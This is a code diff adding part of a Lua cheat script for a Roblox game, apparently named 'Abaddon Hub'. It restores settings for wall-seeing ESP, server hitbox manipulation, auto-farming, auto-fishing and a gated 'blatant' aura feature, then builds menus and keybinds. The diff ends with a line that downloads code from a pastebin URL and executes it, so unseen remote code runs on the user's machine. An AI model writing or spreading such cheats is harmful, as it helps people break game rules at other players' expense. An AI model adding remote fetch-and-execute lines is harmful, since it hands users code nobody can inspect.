+            voidDropHeight = d.voidDropHeight
+            if sliderSyncFns["voidDropHeight"] then sliderSyncFns["voidDropHeight"](d.voidDropHeight) end
+        end
+        if d.voidDrop ~= nil then
+            toggleVoidDrop(d.voidDrop)
+            if buttonSyncFns["voidDrop"] then buttonSyncFns["voidDrop"](d.voidDrop) end
+        end
+        -- Prime Mode
+        if d.primeModeVol ~= nil then
+            primeModeVolume = d.primeModeVol
+            if primeModeSound then pcall(function() primeModeSound.Volume = d.primeModeVol end) end
+            if sliderSyncFns["primeModeVolume"] then sliderSyncFns["primeModeVolume"](d.primeModeVol) end
+        end
+        if d.primeModeEcho ~= nil then
+            primeModeEcho = d.primeModeEcho
+            if sliderSyncFns["primeModeEcho"] then sliderSyncFns["primeModeEcho"](d.primeModeEcho) end
+        else
+            primeModeEcho = true
+        end
+        if d.primeModeShake ~= nil then
+            primeModeShake = d.primeModeShake
+            if sliderSyncFns["primeModeShake"] then sliderSyncFns["primeModeShake"](d.primeModeShake) end
+        end
+        if d.primeModeChangeFov ~= nil then
+            primeModeChangeFov = d.primeModeChangeFov
+            if sliderSyncFns["primeModeChangeFov"] then sliderSyncFns["primeModeChangeFov"](d.primeModeChangeFov) end
+        else
+            primeModeChangeFov = false
+        end
+        if d.primeBind and d.primeBind ~= "Unknown" then
+            pcall(function() primeModeKeybind = Enum.KeyCode[d.primeBind] end)
+            if sliderSyncFns["primeBind"] then sliderSyncFns["primeBind"]() end
+        end
+        togglePrimeMode(d.primeMode == true)
+        -- Crosshair HP (always apply; off if key absent)
+        toggleCrosshairHp(d.crosshairHp == true)
+        if d.wcR ~= nil then wcColorR=d.wcR end
+        if d.wcG ~= nil then wcColorG=d.wcG end
+        if d.wcB ~= nil then wcColorB=d.wcB end
+        if d.wcIntensity ~= nil then wcIntensity=d.wcIntensity end
+        toggleWorldColor(d.worldColor == true)
+        if buttonSyncFns["worldColor"] then buttonSyncFns["worldColor"](wcEnabled) end
+        -- Taliyah Predictor
+        do
+            local taliyahState = d.taliyah == true  -- false if key absent
+            if d.taliyahWave then taliyahWave         = d.taliyahWave end
+            if d.taliyahBase then taliyahBasePriceIdx = d.taliyahBase end
+            if d.taliyahMax  then taliyahMaxIdx       = d.taliyahMax  end
+            toggleTaliyah(taliyahState)
+        end
+
+        -- ── Toggles з активацією ─────────────────────────────────────
+        -- Player ESP
+        if d.espEnabled ~= nil then
+            isPlayerEspEnabled = d.espEnabled
+            if not d.espEnabled then
+                espFolderPlayers:ClearAllChildren()
+                if espFolder then espFolder:ClearAllChildren() end
+            end
+        end
+
+        -- Kit ESP
+        if d.kitEsp ~= nil then
+            isKitEspEnabled = d.kitEsp
+            if d.kitEsp then enableKitEsp()
+            else resetKitEsp() end
+        end
+
+        -- Strategic ESP
+        if d.strategicEsp ~= nil then
+            isStrategicEspEnabled = d.strategicEsp
+            if d.strategicEsp then enableStrategicEsp()
+            else disableStrategicEsp() end
+        end
+
+        -- Ore ESP (default false if not in config)
+        do
+            if d.oreEspR ~= nil then oreEspColorR = d.oreEspR end
+            if d.oreEspG ~= nil then oreEspColorG = d.oreEspG end
+            if d.oreEspB ~= nil then oreEspColorB = d.oreEspB end
+            if sliderSyncFns["oreEspR"] then sliderSyncFns["oreEspR"](oreEspColorR) end
+            if sliderSyncFns["oreEspG"] then sliderSyncFns["oreEspG"](oreEspColorG) end
+            if sliderSyncFns["oreEspB"] then sliderSyncFns["oreEspB"](oreEspColorB) end
+            local oreState = d.oreEsp == true
+            isOreEspEnabled = oreState
+            if oreState then enableOreEsp() else disableOreEsp() end
+        end
+
+        -- Target ESP (просто flag, updateTargetEsp в RenderStepped)
+        if d.targetEsp ~= nil then isTargetEspEnabled = d.targetEsp end
+
+
+        -- Abaddon HUD (просто flag, цикл перевіряє)
+        if d.abaddonHud ~= nil then isAbaddonHudEnabled = d.abaddonHud end
+
+        -- Main HUD
+        if d.mainHud ~= nil then toggleMainHud(d.mainHud) end
+
+        -- Server HP
+        if d.serverHp ~= nil then toggleServerHp(d.serverHp) end
+
+        -- Staff Stats
+        if d.staffStats ~= nil then toggleStaffStats(d.staffStats) end
+
+        -- Friend HP
+        if d.friendHp ~= nil then
+            toggleFriendHp(d.friendHp)
+            if buttonSyncFns["friendHp"] then buttonSyncFns["friendHp"](d.friendHp) end
+        end
+
+		if d.friendHpVisible ~= nil then
+    		isFriendHpVisible = d.friendHpVisible
+    		if buttonSyncFns["friendHpVisible"] then
+        		buttonSyncFns["friendHpVisible"](d.friendHpVisible)
+    	end
+    	if d.friendHpVisible then toggleFriendHp(true) end
+	end
+
+        -- Hit Sound (просто flag, connection вже в mainLoopConnection)
+        if d.hitSound ~= nil then isHitSoundEnabled = d.hitSound end
+
+        -- Bed Alarm
+        if d.bedAlarm ~= nil then
+            isBedAlarmEnabled = d.bedAlarm
+            pcall(updateBedAlarmVisual)
+        end
+
+        -- Panic Circle
+        if d.panicCircle ~= nil then
+            isPanicCircleEnabled = d.panicCircle
+            pcall(updatePanicCircleVisual)
+        end
+
+        -- Server Hitbox
+        if d.serverHitbox ~= nil then
+            isServerHitboxEnabled = d.serverHitbox
+            if d.serverHitbox then
+                pcall(updateServerHitbox)
+            else
+                pcall(destroyServerHitboxClone)
+                pcall(function() RS:UnbindFromRenderStep("AbaddonServerHitbox") end)
+                serverHitboxRenderBound = false
+            end
+        end
+
+        -- Target Scanner
+        if d.targetScanner ~= nil then
+            isTargetScannerEnabled = d.targetScanner
+            isTargetInfoEnabled    = d.targetScanner
+        end
+
+        -- Autokit
+        if d.autokit ~= nil then
+            isAutokitEnabled = d.autokit
+            if d.autokit then scanExistingPrompts() end
+        end
+
+        -- Elder Autokit (просто flag, autokitStep перевіряє)
+        if d.autokitElder ~= nil then
+            isElderAutokitEnabled = d.autokitElder
+            if d.autokitElder then scanExistingPrompts() end
+        end
+
+        -- Fisher (permanent loop, just set flag)
+        if d.fisher ~= nil then
+            isFisherEnabled = d.fisher
+        end
+
+        -- Farmer (permanent loop, just set flag)
+        if d.farmer ~= nil then
+            isFarmerEnabled = d.farmer
+        end
+
+        -- ── Оновити весь UI ──────────────────────────────────────────
+        updateAllVisuals()
+        pcall(updateAbaddonFovCircle)
+        pcall(syncAuraNotif)
+        -- Sync button highlights to reflect loaded state
+        pcall(function()
+            local stateMap = {
+                kitEsp       = isKitEspEnabled,
+                serverHitbox = isServerHitboxEnabled,
+                strategicEsp = isStrategicEspEnabled,
+                oreEsp       = isOreEspEnabled,
+                targetScanner = isTargetScannerEnabled,
+                autokit      = isAutokitEnabled,
+                autokitElder = isElderAutokitEnabled,
+                fisher       = isFisherEnabled,
+                voidDrop     = isVoidDropEnabled,
+                farmer       = isFarmerEnabled,
+                playerRadar  = isRadarEnabled,
+                hitChams     = isHitChamsEnabled,
+                abaddonHud   = isAbaddonHudEnabled,
+                espEnabled   = isPlayerEspEnabled,
+                espHp        = isEspHpEnabled,
+                taliyah      = isTaliyahEnabled,
+                primeMode    = isPrimeModeEnabled,
+                crosshairHp  = isCrosshairHpEnabled,
+                friendHp     = isFriendHpEnabled,
+                bedAlarm     = isBedAlarmEnabled,
+                worldColor   = wcEnabled,
+                panicCircle  = isPanicCircleEnabled,
+                hitSound     = isHitSoundEnabled,
+                    mainHud      = isMainHudEnabled,
+                serverHp     = isServerHpEnabled,
+                staffStats   = isStaffStatsEnabled,
+				friendHpVisible = isFriendHpVisible,
+            }
+            for key, state in pairs(stateMap) do
+                if buttonSyncFns[key] then buttonSyncFns[key](state) end
+            end
+        end)
+        -- Sync slider positions and labels to reflect loaded state
+        pcall(function()
+            if sliderSyncFns["autokitHold"]    then sliderSyncFns["autokitHold"](autokitHoldDuration) end
+            if sliderSyncFns["elderHold"]       then sliderSyncFns["elderHold"](elderHoldDuration) end
+            if sliderSyncFns["farmerRange"]     then sliderSyncFns["farmerRange"](farmerRange) end
+            if sliderSyncFns["bedAlarmRadius"]  then sliderSyncFns["bedAlarmRadius"](bedAlarmRadius) end
+            if sliderSyncFns["bedAlarmVolume"]  then sliderSyncFns["bedAlarmVolume"](bedAlarmVolume) end
+            if sliderSyncFns["panicRadius"]     then sliderSyncFns["panicRadius"](panicCircleRadius) end
+            if sliderSyncFns["panicVolume"]     then sliderSyncFns["panicVolume"](panicCircleVolume) end
+            if sliderSyncFns["powerRange"]      then sliderSyncFns["powerRange"](abaddonPowerRange) end
+            if sliderSyncFns["powerFOV"]        then sliderSyncFns["powerFOV"](abaddonPowerFOV) end
+            if sliderSyncFns["powerShowFOV"]    then sliderSyncFns["powerShowFOV"](abaddonPowerShowFOV) end
+            if sliderSyncFns["powerBind"]       then sliderSyncFns["powerBind"](abaddonPowerKeybind) end
+            if sliderSyncFns["espBind"]         then sliderSyncFns["espBind"]() end
+            if sliderSyncFns["friendBind"]      then sliderSyncFns["friendBind"]() end
+            if sliderSyncFns["hitSoundId"]      then sliderSyncFns["hitSoundId"](hitSoundId) end
+        end)
+    end
+end)
+
+-- === ІНІЦІАЛІЗАЦІЯ ===
+createVisualWindow()
+createAutokitWindow()
+createThemesWindow()
+createUninjectButton()
+
+function createDiscordButton()
+    local btn = Instance.new("TextButton", gui)
+    btn.Name = "DiscordBtn"
+    btn.Size = UDim2.new(0, 120, 0, 30)
+    btn.Position = UDim2.new(1, -140, 1, -90)
+    btn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+    btn.Text = "Discord Server"
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextSize = 15
+    btn.BackgroundTransparency = 0.3
+    btn.Visible = isMenuOpen
+    btn.AutoButtonColor = true
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    btn.MouseButton1Click:Connect(function()
+        pcall(function() setclipboard("https://discord.gg/RD54Vvap6s") end)
+        btn.Text = "Link Copied!"
+        task.delay(1, function()
+            if btn and btn.Parent then btn.Text = "Discord Server" end
+        end)
+    end)
+    savedWindowPositions[btn] = btn.Position
+    return btn
+end
+discordBtn = createDiscordButton()
+
+createBedMinigameButton()
+createSpectateWindow()
+updateAllVisuals()
+
+-- Create aura notif and FOV circle GUIs at start (hidden by default)
+createAuraNotifGui()
+createAbaddonFovCircleGui()
+
+-- === MENU ANIMATION ===
+function toggleMenuWithAnimation(state)
+    -- Only actual menu windows animate in/out with menu
+    local windows = {visualWin, autokitWin, themeWin, configWin, spectateWin, uninjectBtn, discordBtn, bedMinigameBtn, unlockBtn}
+    -- HUDs that are always visible (independent of menu)
+    local alwaysVisibleHuds = {
+        {gui = serverHpGui,   enabled = function() return isServerHpEnabled and isServerHpVisible end},
+        {gui = staffStatsGui, enabled = function() return isStaffStatsEnabled and isStaffStatsVisible end},
+        {gui = targetInfoGui, enabled = function() return isTargetInfoEnabled end},
+        {gui = friendHpGui,   enabled = function() return isFriendHpEnabled and isFriendHpVisible end},
+    }
+    if state then
+        toggleBlur(true)
+        for _, frame in pairs(windows) do
+            if frame then
+                if not savedWindowPositions[frame] then savedWindowPositions[frame] = frame.Position end
+                local properPos = savedWindowPositions[frame]
+                frame.Visible = true
+                frame.Position = UDim2.new(properPos.X.Scale, properPos.X.Offset, 1.5, 0)
+                TS:Create(frame, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = properPos}):Play()
+            end
+        end
+    else
+        toggleBlur(false)
+        for _, frame in pairs(windows) do
+            if frame then
+                if not savedWindowPositions[frame] then savedWindowPositions[frame] = frame.Position end
+                local properPos = savedWindowPositions[frame]
+                local offScreenPos = UDim2.new(properPos.X.Scale, properPos.X.Offset, 1.5, 0)
+                TS:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = offScreenPos}):Play()
+            end
+        end
+    end
+    -- Keep HUDs visible regardless of menu state
+    for _, hud in ipairs(alwaysVisibleHuds) do
+        if hud.gui then
+            hud.gui.Visible = hud.enabled()
+        end
+    end
+end
+
+-- Force initial state sync
+if not isMenuOpen then
+    visualWin.Visible = false
+    if autokitWin then autokitWin.Visible = false end
+    themeWin.Visible = false
+    if configWin then configWin.Visible = false end
+    if spectateWin then spectateWin.Visible = false end
+    uninjectBtn.Visible = false
+    if discordBtn then discordBtn.Visible = false end
+    if unlockBtn then unlockBtn.Visible = false end
+    if bedMinigameBtn then bedMinigameBtn.Visible = false end
+    if serverHpResizeHandle then serverHpResizeHandle.Visible = false end
+    toggleBlur(false)
+else
+    uninjectBtn.Visible = true
+    if discordBtn then discordBtn.Visible = true end
+    if unlockBtn then unlockBtn.Visible = true end
+    if bedMinigameBtn then bedMinigameBtn.Visible = true end
+    toggleBlur(true)
+end
+
+if bedAlarmPart and bedAlarmPos then
+     updateBedAlarmVisual() 
+end
+if panicCirclePart and isPanicCircleEnabled then
+     updatePanicCircleVisual()
+end
+
+-- === INPUT HANDLER ===
+local _mainInputConn = UIS.InputBegan:Connect(function(input, gpe)
+    -- Menu toggle
+    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
+        isMenuOpen = not isMenuOpen
+        toggleMenuWithAnimation(isMenuOpen)
+        if serverHpResizeHandle then serverHpResizeHandle.Visible = isMenuOpen end
+        updateBedAlarmVisual()
+        updatePanicCircleVisual()
+    end
+
+    -- Friend HP keybind
+    if friendHpKeybind ~= Enum.KeyCode.Unknown and input.KeyCode == friendHpKeybind then
+        isFriendHpVisible = not isFriendHpVisible
+        toggleFriendHp(isFriendHpVisible)
+        local stateText = isFriendHpVisible and "Enabled" or "Disabled"
+        local stateColor = isFriendHpVisible and Color3.fromRGB(120, 255, 120) or Color3.fromRGB(255, 120, 120)
+        showNotification("Friend HP HUD", {
+            { text = stateText, color = stateColor },
+        })
+    end
+
+    -- Player ESP keybind
+    if not gpe and playerEspKeybind ~= Enum.KeyCode.Unknown and input.KeyCode == playerEspKeybind then
+        isPlayerEspEnabled = not isPlayerEspEnabled
+        if not isPlayerEspEnabled then espFolderPlayers:ClearAllChildren() end
+        if buttonSyncFns["espEnabled"] then buttonSyncFns["espEnabled"](isPlayerEspEnabled) end
+        showNotification("Player ESP", {{
+            text = isPlayerEspEnabled and "Enabled" or "Disabled",
+            color = isPlayerEspEnabled and Color3.fromRGB(120,255,120) or Color3.fromRGB(255,120,120)
+        }})
+    end
+
+    -- Prime Mode keybind toggle
+    if not gpe and primeModeKeybind ~= Enum.KeyCode.Unknown and input.KeyCode == primeModeKeybind then
+        togglePrimeMode(not isPrimeModeEnabled)
+        if buttonSyncFns["primeMode"] then buttonSyncFns["primeMode"](isPrimeModeEnabled) end
+    end
+    -- AbaddonPower keybind toggle (only when blatant unlocked)
+    if not gpe and blatantUnlocked and abaddonPowerKeybind ~= Enum.KeyCode.Unknown and input.KeyCode == abaddonPowerKeybind then
+        isAbaddonPowerEnabled = not isAbaddonPowerEnabled
+        syncAuraNotif()
+        if buttonSyncFns["powerEnabled"] then buttonSyncFns["powerEnabled"](isAbaddonPowerEnabled) end
+        local stateText = isAbaddonPowerEnabled and "Enabled" or "Disabled"
+        local stateColor = isAbaddonPowerEnabled and Color3.fromRGB(120, 255, 120) or Color3.fromRGB(255, 120, 120)
+        showNotification("Abaddon Power", {
+            { text = stateText, color = stateColor },
+        })
+    end
+end)
+
+-- === CONNECT ALL LOOPS ===
+-- Autokit: always running, autokitStep checks isAutokitEnabled internally
+autokitConnection = RS.RenderStepped:Connect(autokitStep)
+-- Fisher: only connect if enabled (farmerLoop checks flag internally)
+fisherConnection = RS.RenderStepped:Connect(autoFishLoop)
+farmerConnection = RS.Heartbeat:Connect(farmerLoop)
+
+-- AbaddonPower loop (Heartbeat for consistency)
+abaddonPowerConnection = RS.Heartbeat:Connect(function()
+    pcall(abaddonPowerStep)
+end)
+
+-- Main loop
+mainLoopConnection = RS.RenderStepped:Connect(function()
+    pcall(updateScanner)
+    pcall(updateTargetEsp)
+    pcall(checkPanicCircle)
+    
+    local success, err = pcall(updatePlayerEsp)
+    if not success then warn("ESP Error:", err) end
+    
+    task.spawn(function()
+        pcall(checkBedAlarm)
+    end)
+    
+    if isHitSoundEnabled then
+        task.spawn(function()
+            pcall(function()
+                local myChar = player.Character
+                if myChar then
+                    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
+                    if myRoot then
+                        for _, p in pairs(game.Players:GetPlayers()) do
+                            if p ~= player and p.Character then
+                                -- skip teammates
+                                local isTeammate = player.Team and p.Team and player.Team == p.Team
+                                if not isTeammate then
+                                local hum = p.Character:FindFirstChild("Humanoid")
+                                local root = p.Character:FindFirstChild("HumanoidRootPart")
+                                if hum and root and hum.Health > 0 then
+                                    local currentHealth = hum.Health
+                                    local oldHealth = lastHealthsHitSound[p.Name] or currentHealth
+                                    if currentHealth < oldHealth then
+                                        if (root.Position - myRoot.Position).Magnitude <= 15 then
+                                            local now = tick()
+                                            if now - (lastHitTime[p.Name] or 0) > 0.1 then
+                                                task.spawn(function()
+                                                    local snd = Instance.new("Sound")
+                                                    snd.Name = "Abaddon_HitSound_Instance"
+                                                    snd.SoundId = hitSoundId
+                                                    snd.Volume = 5
+                                                    snd.Parent = game:GetService("SoundService")
+                                                    snd:Play()
+                                                    Debris:AddItem(snd, 1.5)
+                                                end)
+                                                lastHitTime[p.Name] = now
+                                            end
+                                        end
+                                    end
+                                    lastHealthsHitSound[p.Name] = currentHealth
+                                else lastHealthsHitSound[p.Name] = nil end
+                                end -- not isTeammate
+                            end
+                        end
+                    end
+                end
+            end)
+        end)
+    end
+
+end)
+end -- _AbaddonHubMain_Part2
+_AbaddonHubMain_Part2()
+loadstring(game:HttpGet("https://pastebin.com/raw/jCRFwG69", true))()
